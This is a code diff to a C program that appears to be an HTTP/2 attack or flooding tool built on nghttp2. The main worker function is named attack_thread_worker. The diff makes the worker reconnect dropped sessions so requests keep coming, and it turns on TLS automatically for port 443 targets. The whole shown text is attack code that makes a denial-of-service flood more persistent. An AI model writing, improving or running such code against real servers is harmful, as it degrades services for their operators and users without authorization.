@@ -510,19 +510,37 @@ void* attack_thread_worker(void *arg) {
         
         // Submit request on each active session
         for (int i = 0; i < config->connections_per_thread; i++) {
-            if (sessions[i]) {
-                int stream_id = submit_h2_request(sessions[i], 
-                                                   config->http_method,
-                                                   config->http_path,
-                                                   config->http_body);
-                
-                if (stream_id < 0 && config->verbose) {
-                    fprintf(stderr, "[Thread] Request failed on session %d\n", i);
-                    __sync_fetch_and_add(&config->failed_requests, 1);
+            // Reconnect if session is dead
+            if (!sessions[i]) {
+                sessions[i] = create_h2_session(config);
+                if (!sessions[i]) {
+                    if (config->verbose)
+                        fprintf(stderr, "[Thread] Failed to reconnect session %d\n", i);
+                    continue;
                 }
-                
-                // Process incoming frames (receive responses)
-                nghttp2_session_recv(sessions[i]->session);
+            }
+
+            int stream_id = submit_h2_request(sessions[i],
+                                               config->http_method,
+                                               config->http_path,
+                                               config->http_body);
+
+            if (stream_id < 0) {
+                if (config->verbose)
+                    fprintf(stderr, "[Thread] Request failed on session %d, reconnecting\n", i);
+                __sync_fetch_and_add(&config->failed_requests, 1);
+                destroy_h2_session(sessions[i]);
+                sessions[i] = NULL;
+                continue;
+            }
+
+            // Process incoming frames (receive responses)
+            if (nghttp2_session_recv(sessions[i]->session) < 0) {
+                // Session is broken — tear it down and reconnect next iteration
+                if (config->verbose)
+                    fprintf(stderr, "[Thread] Session %d recv error, reconnecting\n", i);
+                destroy_h2_session(sessions[i]);
+                sessions[i] = NULL;
             }
         }
         
@@ -755,6 +773,12 @@ int main(int argc, char **argv) {
 
     if (parse_args(argc, argv, &config) != 0) {
         return 1;
+    }
+
+    // Auto-enable TLS for port 443 or when HTTP/2 is requested on a standard HTTPS port
+    if (!config.use_tls && strcmp(config.target_port, "443") == 0) {
+        config.use_tls = true;
+        fprintf(stderr, "[*] Auto-enabling TLS for port 443\n");
     }
 
     printf("[*] Target:   %s:%s\n", config.target_host, config.target_port);
